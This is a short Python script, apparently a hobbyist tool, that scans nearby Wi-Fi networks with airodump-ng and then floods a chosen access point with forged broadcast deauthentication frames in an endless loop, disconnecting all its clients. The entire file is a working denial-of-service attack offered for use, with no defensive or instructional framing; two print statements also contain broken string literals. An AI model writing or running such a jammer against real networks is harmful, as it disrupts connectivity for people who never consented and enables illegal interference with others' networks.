#!/usr/bin/env python3
# X7-Deauth Tool by Amen Allah Abidi
# Instagram: @amen_labidi
# Purpose: Wi-Fi Scanner + Deauthentication Jammer

import os
import time
from scapy.all import *
from threading import Thread

iface = "wlan0mon"  # change if necessary

def scan_networks():
    print("[*] Starting scan...")
    os.system(f"airodump-ng {iface} -w scan_results --output-format csv &")
    time.sleep(10)
    os.system("pkill airodump-ng")

    networks = []
    with open("scan_results-01.csv", "r", encoding='ISO-8859-1') as file:
        for line in file:
            if "WPA" in line or "WEP" in line or "OPN" in line:
                parts = line.split(",")
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                networks.append((bssid, channel, essid))

    print("
Available Networks:")
    for i, net in enumerate(networks):
        print(f"{i}: BSSID: {net[0]}, CH: {net[1]}, SSID: {net[2]}")
    return networks

def deauth(bssid):
    print(f"[*] Sending deauth packets to {bssid}...")
    pkt = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    while True:
        sendp(pkt, iface=iface, inter=0.1, count=100, verbose=False)

if __name__ == "__main__":
    os.system("clear")
    os.system("airmon-ng start wlan0")  # Start monitor mode
    networks = scan_networks()
    
    if not networks:
        print("[-] No networks found.")
        exit()

    choice = int(input("
Select network to jam (index): "))
    target_bssid = networks[choice][0]
    target_channel = networks[choice][1]

    os.system(f"iwconfig {iface} channel {target_channel}")
    time.sleep(2)

    print(f"[*] Jamming {target_bssid} on channel {target_channel}...")
    deauth_thread = Thread(target=deauth, args=(target_bssid,))
    deauth_thread.start()
